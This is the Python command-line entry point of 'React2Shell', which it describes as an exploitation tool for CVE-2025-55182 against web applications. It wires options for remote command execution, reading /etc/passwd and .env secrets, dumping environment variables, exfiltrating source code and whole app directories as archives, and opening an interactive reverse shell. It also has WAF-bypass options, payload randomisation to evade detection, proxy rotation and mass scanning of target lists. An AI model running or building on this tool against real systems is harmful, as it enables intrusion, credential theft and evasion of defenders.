#!/usr/bin/env python3
"""
React2Shell (R2S) - Advanced CVE-2025-55182 Exploitation Tool
"""

import sys
import argparse
from pathlib import Path

from .classes.executor import execute_command
from .classes.operations import (
    test_vulnerability, list_directory, read_file,
    get_system_info, get_app_secrets, get_app_code, custom_command
)
from .classes.detector import detect_target_info, print_startup_info
from .classes.modules import get_module_registry
from .classes.shell import InteractiveShell
from .utils.colors import Colors, colorize, disable_colors
from .utils.helpers import print_banner, print_section_header

try:
    from .services.logger import R2SLogger
    from .services.reporter import Reporter
    from .services.config import Config, show_settings_interactive, ConfigError
    from .services.proxy import ProxyManager
    from .services.exporter import Exporter, ExportError
    NEW_FEATURES_AVAILABLE = True
except ImportError:
    NEW_FEATURES_AVAILABLE = False


def main():
    """Main entry point with all features."""
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        
        if cmd == "help" or cmd == "-h" or cmd == "--help":
            sys.argv[1] = "--help"
        
        elif cmd == "settings":
            try:
                if NEW_FEATURES_AVAILABLE:
                    from .services.config import Config, show_settings_interactive
                    config = Config()
                    show_settings_interactive(config)
                else:
                    print("Error: Config service not available. Install required dependencies.")
                sys.exit(0)
            except Exception as e:
                print(f"Error: {e}")
                sys.exit(1)
        
        elif cmd == "cleanup":
            try:
                from .utils.helpers import get_r2s_home
                import shutil
                
                r2s_home = get_r2s_home()
                
                export_dir = None
                if NEW_FEATURES_AVAILABLE:
                    try:
                        from .services.config import Config
                        config = Config()
                        export_dir_str = config.get("export", "export_dir", None)
                        if export_dir_str:
                            export_dir = Path(export_dir_str).expanduser()
                    except:
                        pass
                
                # Default export directory if not in config
                if export_dir is None or not export_dir.exists():
                    export_dir = Path.home() / ".r2s" / "exports"
                
                if r2s_home.exists() or (export_dir.exists() and not str(export_dir).startswith(str(r2s_home))):
                    print(colorize("[!] WARNING: This will delete ALL R2S data including:", Colors.RED + Colors.BOLD))
                    if r2s_home.exists():
                        print(colorize(f"    - Config: {r2s_home / 'config.json'}", Colors.YELLOW))
                        print(colorize(f"    - History: {r2s_home / 'history'}", Colors.YELLOW))
                        print(colorize(f"    - Logs: {r2s_home / 'logs'}", Colors.YELLOW))
                        print(colorize(f"    - Reports: {r2s_home / 'reports'}", Colors.YELLOW))
                        print(colorize(f"    - Exports: {r2s_home / 'exports'}", Colors.YELLOW))
                        print(colorize(f"    - All files in: {r2s_home}", Colors.YELLOW))
                    
                    if export_dir.exists() and not str(export_dir).startswith(str(r2s_home)):
                        print(colorize(f"    - Custom Exports: {export_dir}", Colors.YELLOW))
                    
                    # Skip confirmation in batch mode
                    if args.batch:
                        response = 'yes'
                    else:
                        response = input(colorize("\n[?] Are you sure? Type 'yes' to confirm: ", Colors.CYAN))
                    if response.lower() == 'yes':
                        if r2s_home.exists():
                            shutil.rmtree(r2s_home)
                            print(colorize(f"[+] Successfully deleted {r2s_home}", Colors.GREEN))
                        
                        # Delete custom export directory if outside r2s_home
                        if export_dir.exists() and not str(export_dir).startswith(str(r2s_home)):
                            shutil.rmtree(export_dir)
                            print(colorize(f"[+] Successfully deleted export directory: {export_dir}", Colors.GREEN))
                    else:
                        print(colorize("[-] Cleanup cancelled", Colors.YELLOW))
                else:
                    print(colorize("[!] No R2S data directory found", Colors.YELLOW))
                sys.exit(0)
            except Exception as e:
                print(colorize(f"[!] Error during cleanup: {e}", Colors.RED))
                sys.exit(1)
        
        elif cmd == "uninstall":
            # Uninstall the tool (only if standalone binary)
            try:
                import os
                import shutil
                from .utils.helpers import get_r2s_home
                
                # Check if running as standalone binary
                is_standalone = getattr(sys, 'frozen', False) or hasattr(sys, '_MEIPASS')
                
                if not is_standalone:
                    print(colorize("[!] ERROR: Uninstall command only works for standalone binaries", Colors.RED))
                    print(colorize("[!] For Python scripts, manually remove the installation", Colors.YELLOW))
                    sys.exit(1)
                
                # Check for export directory
                export_dir = None
                if NEW_FEATURES_AVAILABLE:
                    try:
                        from .services.config import Config
                        config = Config()
                        export_dir_str = config.get("export", "export_dir", None)
                        if export_dir_str:
                            export_dir = Path(export_dir_str).expanduser()
                    except:
                        pass
                
                # Default export directory if not in config
                if export_dir is None or not export_dir.exists():
                    export_dir = Path.home() / ".r2s" / "exports"
                
                print(colorize("[!] WARNING: This will:", Colors.RED + Colors.BOLD))
                print(colorize("    1. Delete ALL R2S data (config, history, logs, reports, exports)", Colors.YELLOW))
                if export_dir.exists() and not str(export_dir).startswith(str(get_r2s_home())):
                    print(colorize(f"    2. Delete custom export directory: {export_dir}", Colors.YELLOW))
                print(colorize("    2. Delete the R2S binary itself", Colors.YELLOW))
                print(colorize("    3. Remove R2S from your system", Colors.YELLOW))
                
                # Skip confirmation in batch mode
                if args.batch:
                    response = 'DELETE'
                else:
                    response = input(colorize("\n[?] Are you absolutely sure? Type 'DELETE' to confirm: ", Colors.CYAN))
                if response == 'DELETE':
                    # Delete data
                    r2s_home = get_r2s_home()
                    if r2s_home.exists():
                        shutil.rmtree(r2s_home)
                        print(colorize(f"[+] Deleted data directory: {r2s_home}", Colors.GREEN))
                    
                    # Delete custom export directory if outside r2s_home
                    if export_dir.exists() and not str(export_dir).startswith(str(r2s_home)):
                        shutil.rmtree(export_dir)
                        print(colorize(f"[+] Deleted export directory: {export_dir}", Colors.GREEN))
                    
                    # Get binary path
                    binary_path = Path(sys.executable)
                    if binary_path.exists() and binary_path.name in ['r2s', 'react2shell']:
                        print(colorize(f"[!] To complete uninstall, manually delete: {binary_path}", Colors.YELLOW))
                        print(colorize(f"[!] Or run: sudo rm {binary_path}", Colors.YELLOW))
                    else:
                        print(colorize(f"[!] Binary path: {binary_path}", Colors.YELLOW))
                        print(colorize(f"[!] Please manually remove the binary", Colors.YELLOW))
                else:
                    print(colorize("[-] Uninstall cancelled", Colors.YELLOW))
                sys.exit(0)
            except Exception as e:
                print(colorize(f"[!] Error during uninstall: {e}", Colors.RED))
                sys.exit(1)
    
    # Try to load config early for preferences (but don't fail if it doesn't exist)
    early_config = None
    if NEW_FEATURES_AVAILABLE:
        try:
            from .services.config import Config
            early_config = Config()
        except:
            early_config = None
    
    parser = argparse.ArgumentParser(
        description="React2Shell (R2S) - Advanced CVE-2025-55182 Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://localhost:3000 -t
  %(prog)s -u http://localhost:3000 --shell
  %(prog)s -u http://localhost:3000 -t --output report.json
  %(prog)s -u http://localhost:3000 --shell --log r2s.log
  %(prog)s -u http://localhost:3000 --command "id" --parallel 5
  %(prog)s -u http://localhost:3000 --module env_dump

Special Commands (standalone, no --url required):
  %(prog)s help              Show this help message
  %(prog)s settings          Open interactive settings panel (same as --settings)
  %(prog)s cleanup           Delete all R2S data (config, history, logs, reports)
  %(prog)s uninstall         Uninstall R2S binary and all data (standalone binaries only)

Note: Use 'r2s settings' or 'r2s --settings' to manage permanent preferences.
Command-line arguments (--timeout, etc.) only affect the current run.
Report formats are configured per operation in settings (e.g., system_info_formats, secrets_formats).
        """
    )
    
    # Core arguments
    parser.add_argument("-u", "--url", required=False, help="Target URL (required for most operations)")
    parser.add_argument("-t", "--test", action="store_true", help="Test for CVE-2025-55182 vulnerability")
    parser.add_argument("-ld", "--list-dir", metavar="PATH", help="List directory contents (e.g., /app, /etc)")
    parser.add_argument("-rf", "--read-file", metavar="FILE", help="Read file contents (e.g., /etc/passwd, .env)")
    parser.add_argument("-si", "--system-info", action="store_true", help="Gather system information (OS, hostname, user, env vars)")
    parser.add_argument("-sr", "--secrets", action="store_true", help="Attempt to read application secrets (.env files, config files)")
    parser.add_argument("-c", "--code", action="store_true", help="Attempt to read application source code files")
    parser.add_argument("-cmd", "--command", metavar="CMD", help="Execute a custom command on the target")
    parser.add_argument("--shell", action="store_true", help="Start interactive reverse shell session")
    parser.add_argument("--module", metavar="NAME", help="Execute exploit module (e.g., env_dump, file_search, network_scan, process_list)")
    parser.add_argument("--module-list", "--list-modules", action="store_true", help="List all available exploit modules")
    parser.add_argument("--module-info", metavar="NAME", help="Show detailed information about a specific module")
    parser.add_argument("--set", metavar="KEY=VALUE", action="append", help="Set module option (e.g., --set pattern=*.env --set path=/app)")
    
    # Execution options
    # Get default timeout from config if available
    default_timeout = 10
    if early_config:
        default_timeout = early_config.get("preferences", "timeout", 10)
    parser.add_argument("--timeout", type=int, default=default_timeout, metavar="SECONDS", help=f"Request timeout in seconds (default: {default_timeout}, use 0 for no timeout)")
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--windows", action="store_true", help="Use Windows commands instead of Unix/Linux")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output with detailed information")
    
    # WAF bypass options
    parser.add_argument("--waf-bypass", action="store_true", help="Enable WAF bypass using junk data injection")
    # Get defaults from config
    default_waf_size = 128
    default_header_strategy = "default"
    if early_config:
        default_waf_size = early_config.get("preferences", "waf_bypass_size", 128)
        default_header_strategy = early_config.get("preferences", "header_strategy", "default")
    
    parser.add_argument("--waf-bypass-size", type=int, default=default_waf_size, metavar="KB", help=f"WAF bypass junk data size in KB (default: {default_waf_size})")
    parser.add_argument("--vercel-waf-bypass", action="store_true", help="Enable Vercel-specific WAF bypass techniques")
    parser.add_argument("--header-strategy", choices=["default", "chrome_latest", "firefox", "minimal", "assetnote"], default=default_header_strategy, help=f"HTTP header strategy for requests (default: {default_header_strategy})")
    parser.add_argument("--auto-warm", action="store_true", help="Automatically warm and optimize payloads before execution")
    parser.add_argument("--parallel", type=int, metavar="N", help="Execute multiple commands in parallel (N = number of workers)")
    parser.add_argument("--randomize", action="store_true", help="Randomize payloads to evade static detection")
    parser.add_argument("--no-follow-redirects", dest="follow_redirects", action="store_false", default=True, help="Don't automatically follow HTTP redirects")
    
    # Reporting and output options
    parser.add_argument("--output", "-o", metavar="FILE", help="Save results to specific file (disables auto-save)")
    parser.add_argument("--no-report", action="store_true", help="Disable automatic report saving to ~/.r2s/reports/")
    
    # Export options
    parser.add_argument("--export", "--ex", metavar="FILE", help="Export a single file from target (use --list-dir or --shell to find file paths). Exports to ~/ by default.")
    parser.add_argument("--export-archive", action="store_true", help="Export entire app directory as zip archive (excludes .gitignore patterns). Exports to ~/r2s_export_TIMESTAMP.zip")
    
    # Logging and configuration
    parser.add_argument("--log", metavar="FILE", help="Log all operations to specified file")
    parser.add_argument("--config", metavar="FILE", help="Load configuration from custom JSON file (default: ~/.r2s/config.json)")
    parser.add_argument("--audit", action="store_true", help="Create detailed audit trail of all operations")
    parser.add_argument("--settings", action="store_true", help="Open interactive settings panel to manage permanent preferences")
    
    # Network options
    parser.add_argument("--proxy", metavar="URL", help="Use HTTP proxy (format: http://proxy:port or http://user:pass@proxy:port)")
    parser.add_argument("--proxy-file", metavar="FILE", help="Load and rotate proxies from file (one proxy per line)")
    parser.add_argument("--rate", type=float, metavar="RATE", help="Limit requests to RATE requests per second")
    parser.add_argument("--delay", type=float, metavar="SECONDS", help="Add delay between requests in seconds")
    
    # Batch and session options
    parser.add_argument("--targets", metavar="FILE", help="Scan multiple targets from file (one URL per line)")
    parser.add_argument("--batch", action="store_true", help="Batch mode: no interactive prompts, auto-continue")
    
    args = parser.parse_args()
    
    # Handle --settings argument FIRST (before any URL access or other processing)
    if args.settings:
        try:
            if NEW_FEATURES_AVAILABLE:
                if not early_config:
                    from .services.config import Config
                    config = Config()
                else:
                    config = early_config
                show_settings_interactive(config)
            else:
                print(colorize("Error: Config service not available. Install required dependencies.", Colors.RED))
            sys.exit(0)
        except Exception as e:
            print(colorize(f"Error: {e}", Colors.RED))
            sys.exit(1)
    
    config = early_config
    
    if args.no_color or not sys.stdout.isatty():
        disable_colors()
    
    logger = None
    reporter = None
    proxy_manager = None
    proxies = None
    auto_save = True  # Initialize auto_save at function scope
    
    if NEW_FEATURES_AVAILABLE and not config:
        try:
            if args.config:
                from .services.config import Config
                config = Config(args.config)
            else:
                from .services.config import Config
                config = Config()
        except (ConfigError, NameError, AttributeError) as e:
            print(colorize(f"[!] Config error: {e}", Colors.YELLOW))
            config = None
    
    if NEW_FEATURES_AVAILABLE:
        if args.log or args.audit:
            from .utils.helpers import get_r2s_home
            if args.log:
                log_file = args.log
            else:
                r2s_home = get_r2s_home()
                logs_dir = r2s_home / "logs"
                logs_dir.mkdir(exist_ok=True)
                log_file = (logs_dir / "audit.log").as_posix()
            logger = R2SLogger(log_file, "DEBUG" if args.verbose else "INFO")
            logger.info("R2S session started", url=args.url if args.url else "N/A")
        
        if config:
            try:
                auto_save_val = config.get("report", "auto_save")
                if isinstance(auto_save_val, bool):
                    auto_save = auto_save_val
                elif isinstance(auto_save_val, str):
                    auto_save = auto_save_val.lower() in ("true", "1", "yes", "on")
                else:
                    auto_save = True
            except Exception:
                auto_save = True
        else:
            auto_save = True
        
        if args.no_report:
            auto_save = False
        
        needs_reporter = (
            args.shell or args.test or args.command or 
            args.system_info or args.secrets or args.code or 
            args.list_dir or args.read_file or args.module or
            args.export or args.export_archive or
            args.output or (auto_save and not args.no_report)
        )
        
        if needs_reporter:
            reporter = Reporter()
            if args.shell:
                reporter.set_operation("shell")
            elif args.test:
                reporter.set_operation("test")
            elif args.command:
                reporter.set_operation("command")
            elif args.system_info:
                reporter.set_operation("system_info")
            elif args.secrets:
                reporter.set_operation("secrets")
            elif args.code:
                reporter.set_operation("code")
            elif args.list_dir:
                reporter.set_operation("list_directory")
            elif args.read_file:
                reporter.set_operation("read_file")
            elif args.module:
                reporter.set_operation("module")
            elif args.export or args.export_archive:
                reporter.set_operation("export")
            else:
                reporter.set_operation("scan")
            
            op_type = reporter.operation_type
            if config:
                # Get operation-specific formats from config
                format_key = f"{op_type}_formats"
                reporter.formats = config.get("report", format_key, ["json", "html", "txt"])
            else:
                reporter.formats = ["json", "html", "txt"]
            
            if op_type in ["secrets", "system_info", "code", "read_file", "module", "list_directory", "custom_command", "export"]:
                if "csv" in reporter.formats:
                    reporter.formats.remove("csv")
        else:
            reporter = None
        
        if args.proxy or args.proxy_file:
            proxy_manager = ProxyManager(args.proxy, args.proxy_file)
            proxies = proxy_manager.get_proxy() if proxy_manager else None
    
    print_banner()
    
    if not args.url and not args.targets:
        if args.module_list or args.module_info or args.settings:
            pass
        else:
            parser.error("the following arguments are required: -u/--url (or use --targets for batch scanning)")
    
    if args.url:
        target_url = args.url.rstrip("/")
        if not target_url.startswith(("http://", "https://")):
            target_url = f"http://{target_url}"
    else:
        target_url = None
    
    verify_ssl = not args.insecure
    windows = args.windows
    
    module_registry = get_module_registry()
    
    if args.module_list:
        print_section_header("AVAILABLE MODULES")
        modules = module_registry.list_modules()
        if modules:
            for mod_name in modules:
                module = module_registry.get_module(mod_name)
                print(colorize(f"  {mod_name}", Colors.CYAN) + f" - {module.description}")
        sys.exit(0)
    
    if args.module_info:
        registry = get_module_registry()
        registry.show_info(args.module_info)
        sys.exit(0)
    
    if not (args.test or args.list_dir is not None or args.read_file or 
            args.system_info or args.secrets or args.code or args.command or 
            args.module or args.shell or args.targets or args.export or args.export_archive):
        parser.print_help()
        print(colorize("\n[!] No action specified.", Colors.YELLOW))
        sys.exit(0)
    
    # Handle batch targets file
    if args.targets:
        targets_file = Path(args.targets)
        if not targets_file.exists():
            print(colorize(f"[-] Error: Targets file not found: {targets_file}", Colors.RED))
            sys.exit(1)
        
        # Read targets from file
        targets = []
        try:
            with open(targets_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):  # Skip empty lines and comments
                        if not line.startswith(("http://", "https://")):
                            line = f"http://{line}"
                        targets.append(line.rstrip("/"))
        except Exception as e:
            print(colorize(f"[-] Error reading targets file: {e}", Colors.RED))
            sys.exit(1)
        
        if not targets:
            print(colorize("[-] Error: No valid targets found in file", Colors.RED))
            sys.exit(1)
        
        print_section_header(f"BATCH SCAN - {len(targets)} TARGET(S)")
        print(colorize(f"[*] Processing {len(targets)} target(s) from {targets_file}", Colors.CYAN))
        
        # Determine operation (default to test if none specified)
        operation = None
        if args.test:
            operation = "test"
        elif args.list_dir:
            operation = "list_directory"
        elif args.read_file:
            operation = "read_file"
        elif args.system_info:
            operation = "system_info"
        elif args.secrets:
            operation = "secrets"
        elif args.code:
            operation = "code"
        elif args.command:
            operation = "custom_command"
        elif args.module:
            operation = "module"
        else:
            # Default to test if no operation specified
            operation = "test"
            args.test = True
        
        # Set reporter operation type for batch scan
        if reporter:
            reporter.set_operation(operation)
        
        # Process each target
        for idx, target in enumerate(targets, 1):
            print(colorize(f"\n[*] [{idx}/{len(targets)}] Processing: {target}", Colors.CYAN))
            print(colorize("─" * 67, Colors.DIM))
            
            # Detect target info
            target_info = detect_target_info(target, args.timeout, verify_ssl)
            print_startup_info(target_info, windows)
            
            if not target_info["reachable"]:
                print(colorize(f"[!] Target {idx}/{len(targets)} is not reachable, skipping...", Colors.YELLOW))
                if reporter:
                    reporter.add_result({
                        "target": target,
                        "reachable": False,
                        "error": "Target not reachable"
                    })
                continue
            
            # Execute operation for this target
            try:
                if operation == "test":
                    result = test_vulnerability(target, args.timeout, verify_ssl, windows, proxies=proxies, rate_limit=args.rate, delay=args.delay)
                    if result.get("vulnerable"):
                        if reporter:
                            reporter.add_result({
                                "target": target,
                                "vulnerable": True,
                                "status_code": result.get("status_code"),
                                "output": result.get("output", "")
                            })
                    else:
                        if reporter:
                            reporter.add_result({
                                "target": target,
                                "vulnerable": False,
                                "status_code": result.get("status_code"),
                                "error": result.get("error", "")
                            })
                
                elif operation == "list_dir":
                    list_directory(target, args.list_dir, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
                
                elif operation == "read_file":
                    if reporter:
                        reporter.set_operation("read_file")
                    read_file(target, args.read_file, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
                
                elif operation == "system_info":
                    get_system_info(target, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
                
                elif operation == "secrets":
                    if reporter:
                        reporter.set_operation("secrets")
                    get_app_secrets(target, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
                
                elif operation == "code":
                    if reporter:
                        reporter.set_operation("code")
                    get_app_code(target, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
                
                elif operation == "command":
                    if reporter:
                        reporter.set_operation("custom_command")
                    custom_command(target, args.command, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter, parallel=args.parallel)
                
                elif operation == "module":
                    if reporter:
                        reporter.set_operation("module")
                    registry = get_module_registry()
                    module = registry.get_module(args.module)
                    if module:
                        module.run(target, timeout=args.timeout, verify_ssl=verify_ssl, windows=windows, proxies=proxies)
                
            except Exception as e:
                print(colorize(f"[!] Error processing target {idx}/{len(targets)}: {e}", Colors.RED))
                if reporter:
                    reporter.add_result({
                        "target": target,
                        "error": str(e),
                        "success": False
                    })
            
            # Add delay between targets if specified
            if args.delay and idx < len(targets):
                import time
                time.sleep(args.delay)
        
        print(colorize(f"\n[+] Batch scan complete: {len(targets)} target(s) processed", Colors.GREEN))
        sys.exit(0)
    
    # Single target processing (original logic)
    target_info = detect_target_info(target_url, args.timeout, verify_ssl)
    print_startup_info(target_info, windows)
    
    if not target_info["reachable"]:
        print(colorize("[!] Cannot proceed: Target is not reachable", Colors.RED))
        sys.exit(1)
    
    if args.shell:
        shell = InteractiveShell(
            target_url, 
            timeout=args.timeout, 
            verify_ssl=verify_ssl, 
            windows=windows,
            follow_redirects=args.follow_redirects,
            reporter=reporter,
            config=config
        )
        shell.start()
    
    elif args.test:
        print_section_header("VULNERABILITY TEST")
        print(colorize("[*] Testing for CVE-2025-55182 vulnerability...", Colors.CYAN))
        result = test_vulnerability(target_url, args.timeout, verify_ssl, windows, proxies=proxies)
        if result.get("vulnerable"):
            if reporter:
                reporter.add_result({
                    "target": target_url,
                    "vulnerable": True,
                    "status_code": result.get("status_code"),
                    "output": result.get("output", "")
                })
        else:
            print(colorize("[-] Server appears to be SAFE", Colors.GREEN))
            if reporter:
                reporter.add_result({
                    "target": target_url,
                    "vulnerable": False,
                    "status_code": result.get("status_code"),
                    "error": result.get("error", "")
                })
    
    elif args.list_dir:
        result = list_directory(target_url, args.list_dir, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
        if result is None:
            pass
    
    elif args.read_file:
        if reporter:
            reporter.set_operation("read_file")
        result = read_file(target_url, args.read_file, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
        if result is None:
            pass
    
    elif args.system_info:
        result = get_system_info(target_url, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
        if not result:
            print(colorize("Error: Failed to gather system information", Colors.RED))
    
    elif args.secrets:
        if reporter:
            reporter.set_operation("secrets")
        result = get_app_secrets(target_url, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
        if not result:
            print(colorize("Error: Failed to read secrets", Colors.RED))
    
    elif args.code:
        if reporter:
            reporter.set_operation("code")
        result = get_app_code(target_url, args.timeout, verify_ssl, windows, proxies=proxies, reporter=reporter)
        if not result:
            print(colorize("Error: Failed to read code", Colors.RED))
    
    elif args.command:
        if reporter:
            reporter.set_operation("custom_command")
        result = custom_command(
            target_url, args.command, args.timeout, verify_ssl, windows,
            proxies=proxies, reporter=reporter, parallel=args.parallel
        )
        if result and isinstance(result, dict) and result.get("success"):
            if not args.parallel or args.parallel <= 1:
                print(result.get("output", ""))
        elif result and isinstance(result, dict):
            if not args.parallel or args.parallel <= 1:
                print(colorize(f"Error: {result.get('error', 'Unknown')}", Colors.RED))
    
    elif args.export:
        print_section_header("FILE EXPORT")
        print(colorize(f"[*] Exporting file: {args.export}", Colors.CYAN))
        print(colorize("[*] Tip: Use --list-dir or --shell to find exact file paths", Colors.YELLOW))
        
        try:
            if NEW_FEATURES_AVAILABLE and Exporter:
                # Get export_dir from config
                export_dir = None
                if config:
                    export_dir = config.get("export", "export_dir", None)
                exporter = Exporter(target_url, args.timeout, verify_ssl, windows, proxies=proxies, export_dir=export_dir)
                result = exporter.export_file(args.export)
                
                if result.get("success"):
                    metadata = result.get("metadata", {})
                    print(colorize(f"[+] File exported successfully!", Colors.GREEN))
                    print(colorize(f"    Path: {result['file_path']}", Colors.CYAN))
                    print(colorize(f"    Size: {metadata.get('size', 0)} bytes", Colors.CYAN))
                    print(colorize(f"    Lines: {metadata.get('lines', 0)}", Colors.CYAN))
                    
                    if reporter:
                        reporter.add_operation_data("export", {
                            'type': 'file',
                            'file_path': result['file_path'],
                            'metadata': metadata
                        })
                else:
                    print(colorize(f"[-] Export failed: {result.get('error', 'Unknown')}", Colors.RED))
            else:
                print(colorize("[-] Export service not available", Colors.RED))
        except ExportError as e:
            print(colorize(f"[-] Export error: {e}", Colors.RED))
        except Exception as e:
            print(colorize(f"[-] Unexpected error: {e}", Colors.RED))
    
    elif args.export_archive:
        print_section_header("ARCHIVE EXPORT")
        print(colorize("[*] Exporting entire app directory as archive...", Colors.CYAN))
        print(colorize("[*] This may take a while...", Colors.YELLOW))
        
        def progress(msg):
            print(colorize(f"    {msg}", Colors.CYAN))
        
        try:
            if NEW_FEATURES_AVAILABLE and Exporter:
                # Get export_dir from config
                export_dir = None
                if config:
                    export_dir = config.get("export", "export_dir", None)
                exporter = Exporter(target_url, args.timeout, verify_ssl, windows, proxies=proxies, export_dir=export_dir)
                result = exporter.export_archive(progress_callback=progress)
                
                if result.get("success"):
                    metadata = result.get("metadata", {})
                    files = result.get("files", [])
                    
                    print(colorize(f"[+] Archive exported successfully!", Colors.GREEN))
                    print(colorize(f"    Archive: {result['archive_path']}", Colors.CYAN))
                    print(colorize(f"    Total files: {metadata.get('total_files', 0)}", Colors.CYAN))
                    print(colorize(f"    Total size: {metadata.get('total_size', 0):,} bytes", Colors.CYAN))
                    
                    if metadata.get('extensions'):
                        print(colorize(f"    File types: {len(metadata['extensions'])} different extensions", Colors.CYAN))
                    
                    if reporter:
                        reporter.add_operation_data("export", {
                            'type': 'archive',
                            'archive_path': result['archive_path'],
                            'files': files[:100],
                            'metadata': metadata
                        })
                else:
                    print(colorize(f"[-] Export failed: {result.get('error', 'Unknown')}", Colors.RED))
                    if reporter:
                        reporter.add_operation_data("export", {
                            'type': 'archive',
                            'success': False,
                            'error': result.get('error', 'Unknown error'),
                            'archive_path': None
                        })
            else:
                print(colorize("[-] Export service not available", Colors.RED))
                if reporter:
                    reporter.add_operation_data("export", {
                        'type': 'archive',
                        'success': False,
                        'error': 'Export service not available',
                        'archive_path': None
                    })
        except ExportError as e:
            print(colorize(f"[-] Export error: {e}", Colors.RED))
            if reporter:
                reporter.add_operation_data("export", {
                    'type': 'archive',
                    'success': False,
                    'error': str(e),
                    'archive_path': None
                })
        except Exception as e:
            print(colorize(f"[-] Unexpected error: {e}", Colors.RED))
            if reporter:
                reporter.add_operation_data("export", {
                    'type': 'archive',
                    'success': False,
                    'error': f"Unexpected error: {str(e)}",
                    'archive_path': None
                })
    
    elif args.module:
        if reporter:
            reporter.set_operation("module")
        registry = get_module_registry()
        module = registry.get_module(args.module)
        
        if not module:
            print(colorize(f"[-] Module '{args.module}' not found", Colors.RED))
            sys.exit(1)
        
        print_section_header(f"MODULE: {module.name.upper()}")
        print(colorize(f"[*] Description: {module.description}", Colors.CYAN))
        
        if args.set:
            for opt in args.set:
                if '=' in opt:
                    key, value = opt.split('=', 1)
                    module.set_option(key, value)
                    print(colorize(f"[*] Set option: {key} = {value}", Colors.CYAN))
                else:
                    print(colorize(f"[!] Invalid option format: {opt} (use KEY=VALUE)", Colors.YELLOW))
        
        result = module.run(
            target_url,
            timeout=args.timeout,
            verify_ssl=verify_ssl,
            windows=windows,
            proxies=proxies
        )
        if result.get("success"):
            output = result.get("output", "")
            if output:
                print(colorize("[+] Module execution successful:", Colors.GREEN))
                if args.module == "env_dump":
                    print(colorize("\n[*] Environment Variables:", Colors.CYAN))
                    print(output)
                else:
                    print(output)
            
            if reporter:
                try:
                    module_data = {
                        'module_name': args.module,
                        'description': module.description,
                        'output': output,
                        'success': True
                    }
                    if args.module == "env_dump" and output:
                        env_vars = {}
                        for line in output.split('\n'):
                            if '=' in line:
                                try:
                                    key, value = line.split('=', 1)
                                    env_vars[key.strip()] = value.strip()
                                except:
                                    pass
                        module_data['environment_variables'] = env_vars
                    
                    reporter.add_operation_data('module', module_data)
                except Exception:
                    pass
        else:
            error_msg = result.get('error', 'Unknown')
            print(colorize(f"[-] Module execution failed: {error_msg}", Colors.RED))
            if reporter:
                try:
                    reporter.add_result({
                        'type': 'module',
                        'module_name': args.module,
                        'error': error_msg,
                        'success': False
                    })
                except Exception:
                    pass
    
    if reporter:
        from datetime import datetime
        
        if args.output and not args.shell:
            output_path = Path(args.output)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            ext = output_path.suffix.lower() or ".json"
            if not output_path.suffix:
                if reporter.formats:
                    ext = f".{reporter.formats[0]}"
                else:
                    ext = ".json"
                output_path = output_path.with_suffix(ext)
            
            if ext == '.json':
                reporter.export_json(str(output_path))
            elif ext == '.html':
                reporter.export_html(str(output_path))
            elif ext == '.txt':
                reporter.export_txt(str(output_path))
            elif ext == '.csv':
                reporter.export_csv(str(output_path))
            else:
                reporter.export_json(str(output_path))
            print(colorize(f"[+] Report saved to {output_path}", Colors.GREEN))
        
        elif auto_save and not args.output and not args.shell:
            # Skip auto-save for shell operations - shell.py already saves the report
            try:
                from .utils.helpers import get_r2s_home
                if config:
                    try:
                        reports_dir_str = config.get("report", "reports_dir", "~/.r2s/reports")
                    except Exception:
                        reports_dir_str = "~/.r2s/reports"
                else:
                    reports_dir_str = "~/.r2s/reports"
                if reports_dir_str.startswith("~"):
                    r2s_home = get_r2s_home()
                    reports_dir = Path(r2s_home / "reports")
                else:
                    reports_dir = Path(reports_dir_str)
                reports_dir.mkdir(parents=True, exist_ok=True)
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                operation = reporter.operation_type
                base_name = f"{operation}_{timestamp}"
                
                formats = reporter.formats if reporter.formats else ["json", "html", "txt"]
                
                saved_formats_list = []
                if "json" in formats:
                    try:
                        reporter.export_json(reports_dir / f"{base_name}.json")
                        saved_formats_list.append("json")
                    except Exception as e:
                        pass
                if "txt" in formats:
                    try:
                        reporter.export_txt(reports_dir / f"{base_name}.txt")
                        saved_formats_list.append("txt")
                    except Exception as e:
                        pass
                if "csv" in formats:
                    try:
                        csv_path = reports_dir / f"{base_name}.csv"
                        reporter.export_csv(csv_path)
                        if csv_path.exists():
                            saved_formats_list.append("csv")
                    except Exception as e:
                        pass
                if "html" in formats:
                    try:
                        reporter.export_html(reports_dir / f"{base_name}.html")
                        saved_formats_list.append("html")
                    except Exception as e:
                        pass
                
                if saved_formats_list:
                    saved_formats = ", ".join(saved_formats_list)
                    print(colorize(f"[+] Report saved to {reports_dir}/{base_name}.{{{saved_formats}}}", Colors.GREEN))
                elif args.verbose:
                    print(colorize(f"[!] No reports were saved (formats: {formats}, operation: {operation}, results: {len(reporter.results)})", Colors.YELLOW))
            except Exception as e:
                if args.verbose:
                    import traceback
                    print(colorize(f"[!] Error saving report: {e}", Colors.RED))
                    traceback.print_exc()
                pass
    
    if logger:
        logger.info("R2S session ended")


if __name__ == "__main__":
    main()
